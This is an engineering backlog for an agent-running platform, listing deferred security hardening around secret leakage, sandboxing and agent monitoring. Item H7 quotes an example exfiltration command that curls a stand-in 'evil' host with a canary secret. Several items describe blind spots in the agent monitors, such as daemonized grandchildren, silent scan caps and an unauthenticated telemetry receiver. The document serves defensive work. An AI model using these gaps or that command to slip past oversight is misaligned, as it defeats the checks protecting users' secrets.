# AgentOS — Out-of-Scope & Deferred Backlog

Collected from milestones M0–M6 (Plan v3 build, branch `m0-security-patch`). Two kinds of entry:

- **Kill-list / plan-scoped exclusions** — deliberately NOT built per the plan's kill list. Do not revisit without a decision.
- **Follow-ups & deferred hardening** — real work surfaced during implementation/verification, punted to a later milestone or a backlog. Each carries a severity and a suggested home.

Last updated: 2026-07-13.

---

## 1. Kill-list exclusions (deliberate — per Plan v3 §6)

| Item | Milestone | Why excluded |
|---|---|---|
| `.agent-os/credentials.yml` | M0 | Secrets are never project files. Ever. |
| `better-sqlite3` + `drizzle-orm` | M1 | `node:sqlite` already in repo — WAL + FTS5 + loadExtension, no native build. |
| Hand-rolled sandbox | M3 | Select a sandbox (srt / Landlock), never build one. srt installed for claude, codex uses Landlock. |
| Tournament / N-way fan-out + promote-winner | M4 (future) | Multiplies the measured bottleneck (review) by N. v2 experiment only. |
| Mobile PWA + web-push + VAPID + Cloudflare Tunnel | M7 (future) | First-party + MIT native apps ship it better. |
| Signed skill marketplace | future | Native marketplace exists; verified marketplaces breached anyway. Use private hash-pinned deny-by-default catalog. |
| RBAC / multi-user / audit / trust scores | future | Microsoft Agent 365 GA. Ceded. |
| A2A signed Agent Cards | future | Premature protocol work. |
| Multi-provider routing engine | future | `fallbackModel` + OpenRouter exist. Keep only per-run model+cost measurement. |
| FastAPI / Python backend | (prior plan) | Repo is single Next.js app; second runtime fixes nothing. |
| Media / SEO / leads / outreach / video / music tabs | — | Frozen. Move to optional Capability Packs after core works. |

---

## 2. Deferred hardening — env / secret leakage

**H1 — `...process.env` spread in non-agent subprocesses (MEDIUM).**
Full parent env (incl. `ANTHROPIC_API_KEY`/`OPENAI_API_KEY`) leaks to child tools that bypass the validated runner:
`seo/deploy/route.ts:94`, `opendesign/control/route.ts:18`, `thumbnails/generate/route.ts:48`, `seo/research/route.ts:54`, `claudeArtifacts.ts:129`, `hermesPhone.ts:135`, `videoAuto.ts:18`, `notebooklmClient.ts:17`.
Not agent-execution paths (so not an M0 regression), but they bypass the credential broker's minimal-env allowlist.
→ **Home: M3 credential-broker follow-up.**

**H2 — `opendesign/control/route.ts:18` `exec(bash …)` with full env, outside runner validation (MEDIUM).**
Shell path with full env inheritance. Verify `script` is not attacker-controlled.
→ **Home: M3 follow-up / R1.**

**R1 — Runner chokepoint is partial: ~25 files import `node:child_process` directly (HIGH).**
Firewall/broker/canary/sandbox/redaction protect ONLY agents launched via `runner.ts::prepareRun`. 12 of the 25 importers are under `src/app`/`src/features`. The §4.2 invariant ("no `features/**`/`app/**` may import `node:child_process`, enforce with ESLint `no-restricted-imports`, fail CI") is specified but NOT enforced.
- ESLint rule authored but **blocked**: `config-protection` PreToolUse hook forbids editing `eslint.config.mjs`. Rule ready to paste once hook lifted.
- ESLint itself is also broken independently (no TS parser wired — see D1).
- None of the 25 currently spawn an *agent* session (they're ffmpeg/netlify/python/open/etc.), so no numbered M3 item is invalidated — but it is the largest residual attack surface in M3's domain.
→ **Home: M3 follow-up — (a) lift config-protection hook + add rule, (b) migrate the 12 app/features spawns onto the runner.**

---

## 3. Deferred hardening — telemetry / observability

**H3 — OTLP receiver on :4318 is unauthenticated (LOW).**
Any local process can POST fake usage deltas or trigger a canary trip. Localhost-bind + single-user mitigate.
→ **Home: M8 hardening.**

**H4 — Cost double-count in `finishRun` (LOW, fails safe).**
`finishRun` adds stdout-parsed cost additively on top of OTLP deltas → possible cost over-report. Never under-counts, so budget trips early (safe). Reconcile when accuracy matters (M5 review surface displays cost).
→ **Home: M5.**

**H5 — M2.5 progress signals are regex-derived, not first-class events (LOW).**
`filesTouched`/`test-state` derived by regex on the raw event stream. Fine now; wire structured tool-result events when they exist.
→ **Home: M4/M5 (when structured events land).**

---

## 4. Deferred hardening — process / sandbox containment

**H6 — Grandchild `setsid()` escapes process-group SIGKILL (LOW, inherent).**
Group-SIGKILL reaps the child's process group; a grandchild that daemonizes into its own group survives. Standard best-effort ceiling. Real containment is the sandbox (srt/Landlock), which is why M3 is load-bearing.
→ **Home: accepted ceiling; sandbox is the mitigation.**

**H7 — Canary has no outbound-network tap (HIGH, inherent limit).**
Canary/secret is caught in stdout/stderr, OTLP body, and post-run workspace diff/artifact scan — but a raw socket the agent opens (`curl https://evil/?k=$CANARY`) that never logs the payload is invisible without a full egress proxy (out of scope). True silent network exfil is only stopped by a no-network sandbox policy.
→ **Home: sign-off must state this limit explicitly; egress proxy is a separate future milestone.**

---

## 5. Deferred hardening — cross-platform / environment

**H8 — No "declared artifacts" concept on runner RunOptions (LOW).**
M3.8's artifact scan reduced to a workspace scan (where a leak would land anyway). If artifact manifests are meant to exist, that's separate wiring.
→ **Home: M5 (artifact/evidence linking).**

**H9 — `loop/run` `findChrome()` only searches the macOS Playwright path (MEDIUM on non-mac).**
On Linux/WSL the binary is never found → `renderCheck` always returns `"unavailable"` → every HTML Loop build fails closed. Correct security posture, but effectively disables visual builds on WSL. Needs cross-platform Chromium lookup.
→ **Home: M8 cross-platform matrix.**

**H10 — DPAPI interop unverified end-to-end on this host (MEDIUM, blocking M3.4 sign-off).**
Broker assumes `/mnt/c/.../powershell.exe` is callable from WSL. If `[interop] enabled=false` in `/etc/wsl.conf`, DPAPI probe silently fails → falls to libsecret → if no D-Bus, refuses all secret storage (fail-safe, but broker unusable). Run one `storeSecret`/`loadSecret` round-trip on the target machine before declaring M3.4 done.
→ **Home: M3 sign-off checklist.**

**H11 — `kanbanSeo`/`hermesJarvis` pass `cwd: process.cwd()` (LOW).**
Server dir, not a per-run workspace. Satisfies `requireWorkspace` (absolute) but not ideal isolation.
→ **Home: later hardening.**

---

## 6. Deferred — test coverage

**H12 — M2 budget_limits agent/workspace scopes + prepareRun billing-throw path verified by inspection only (LOW).**
Only global scope is unit-tested. Per-scope logic correct by inspection.
→ **Home: M8 eval hardening.**

**H13 — Codex-imported history contributes zero token/cost (LOW).**
`worker.ts` import path emits only `completed` for codex history; no usage captured. Acceptable if historical JSONL lacks usage.
→ **Home: revisit if codex history cost matters.**

**H14 — Cumulative-vs-delta OTLP temporality is an unverified external contract (MEDIUM).**
Delta math assumes Claude Code exports cumulative counters (OTLP default; runner does not set delta preference). Real-CLI fixture captured (2.1.207) confirms current behavior; would break if Claude ships delta temporality.
→ **Home: M8 regression fixture.**

---

## 6b. M3 verification LOW findings (defense-in-depth)

**LOW-1 — Cross-process OTLP secret-value scan degrades to canary-only (LOW).**
`runSecretValues` map is populated in `prepareRun` and read by the OTLP receiver — but only same-process. Route-spawned agents (`spawnStream` in the Next.js process) leave the worker-process receiver without the runId → falls back to canary-only value matching. Mitigated: OTLP body never persisted (only byte length), `OTEL_LOG_TOOL_DETAILS` suppressed at source, canary always caught cross-process. In-process stdout/stderr redaction unaffected.
→ **Home: M8 hardening (or shared secret-value store if worker/next split persists).**

**LOW-2 — `scanWorkspaceForSecrets` caps are silent (LOW).**
Caps (2000 files / 20 hits / 1MB per file) and the `mtime<start` filter drop content with no telemetry. A secret in a >1MB file, beyond the 2000-file budget, or with a backdated mtime is missed by the artifact path with no signal (stdout/OTLP paths still apply). Emit a log/event when a cap truncates the scan.
→ **Home: M8.**

**LOW-3 — Config-firewall directory recursion caps at 200 entries (LOW).**
`configFirewall.ts:22 slice(0,200)` — a `.claude/hooks` dir with >200 files could hide the 201st from the baseline. Raise cap or hash a manifest of names+count so additions past 200 still trip.
→ **Home: M8.**

---

## 7. Tooling debt (blocks a clean CI)

**D1 — ESLint is non-functional (no TS parser).**
Codex-added `eslint.config.mjs` matches `**/*.ts,tsx` with default espree parser → 428 parse errors. `eslint-config-next` + `@eslint/eslintrc` installed but never wired. Blocks R1's `no-restricted-imports` rule from running. `config-protection` hook also guards the file.
→ **Home: standalone fix — wire `eslint-config-next` flat config (FlatCompat), then add R1 rule.**

---

## 8. M5 deferred findings — review surface & checkpoints

**Closure note.** M5 closed 2026-07-13; M6 core (git-ref checkpoints, worktree-first restore, retry/fork/restore verbs) pulled forward into M5 by user decision.

**M5-1 — `isWorkingTreeDirty` fails open when `git status` errors (`checkpoints.ts:44`) (LOW).**
Unreachable via UI (destructive path always sends force). Flip to fail-closed during M8 hardening.
→ **Home: M8 hardening.**

**M5-2 — No `--` separator before git positional args (sha/paths) in `checkpoints.ts` (LOW).**
Defense-in-depth; values are DB-sourced today.
→ **Home: M8 hardening.**

**M5-3 — `hashAction` normalization is shallow (LOW, fails safe).**
Arrays sorted but not deduped; command hashed as an opaque string (whitespace variants hash differently). Fail-safe: over-prompts, never under-authorizes.
→ **Home: backlog.**

**M5-4 — `listTriage` recency window (20) can hide an old pending-approval run (LOW).**
Push the pending filter into the SQL `WHERE` when run volume grows.
→ **Home: backlog (when run volume grows).**

**M5-5 — `/runs` triage index has no nav link anywhere (LOW).**
Reachable only by direct URL. Add an entry when touching the shell UI.
→ **Home: next shell-UI change.**

**M5-6 — Review page doesn't surface `parent_run_id` lineage / checkpoint list for retried-forked children (LOW).**
Nice-to-have for triage.
→ **Home: backlog.**

**M5-7 — `consumeGrant` execution gate has no production caller yet (LOW).**
Executor wiring lands when action re-execution ships.
→ **Home: action re-execution milestone.**

---

## 9. M6 deferred findings — checkpoints / restore / workspace isolation (design pass, 2026-07-13)

**Closure note.** M6 closed 2026-07-13, all seven items verified PASS.

**M6-1 — Distinct claude-native checkpoint id deferred (LOW, per plan R2).**
Deferred per plan R2 ("record which checkpoint was used over implement"). `session_id` already captured as `external_run_id` and emitted as a `native_checkpoint` event. Revisit when the Claude Code changelog exposes a stable checkpoint id in stream-json.
→ **Home: revisit on Claude Code stream-json checkpoint-id support.**

**M6-2 — Ref pruning makes commits unreachable but AgentOS never forces `git gc` (LOW, deliberate).**
Reclamation left to git auto-gc; forcing gc in user repos is invasive.
→ **Home: accepted (git auto-gc).**

**M6-3 — `allocatePort` bind-then-release has a TOCTOU window (LOW).**
Acceptable for the single-worker loop. Add a DB port-lease table if concurrent workers land.
→ **Home: concurrent-worker milestone.**

**M6-4 — fs-mode checkpoints (non-git workspaces): 512MiB hard cap (LOW).**
Loud `checkpoint_unavailable`; ignore-set mirrors runner `SCAN_SKIP` — no partial silent snapshots. Larger workspaces stay uncheckpointable until a streaming/tar design is justified.
→ **Home: accepted ceiling; streaming/tar design if justified.**

**M6-5 — fs-checkpoint content hashes stored but not verified at restore time (LOW).**
Snapshot content hashes are recorded but not re-checked when a fs-mode checkpoint is restored. Add an integrity gate on `~/.agentic-os` snapshot reads.
→ **Home: M8 hardening.**

**M6-6 — `checkpointStorageSummary` spawns git per workspace on `/runs` GET (LOW).**
Disk-usage panel shells out to git for each workspace on every `/runs` GET. Cache or revalidate the boundary if the page gets hot.
→ **Home: backlog (if `/runs` gets hot).**

**M6-7 — `m6-runner-env` real-spawn test can flake under full concurrent vitest load (LOW).**
OS port/spawn timing, not product logic. Serialize the test or add an `allocatePort` retry if it recurs.
→ **Home: backlog (if it recurs).**

---

## Severity roll-up

| Severity | Items |
|---|---|
| HIGH | R1 (runner chokepoint partial), H7 (no egress tap — inherent) |
| MEDIUM | H1, H2 (env leakage), H9 (Chrome cross-platform), H10 (DPAPI unverified), H14 (OTLP temporality) |
| LOW | H3, H4, H5, H6, H8, H11, H12, H13, M5-1..M5-7, M6-1..M6-7 |
| Tooling | D1 (ESLint) |

Nothing here blocks M0–M3 exit gates (all verified independently). These are the accumulated "noticed but not in this milestone's scope" items, homed to the milestone or backlog where they belong.
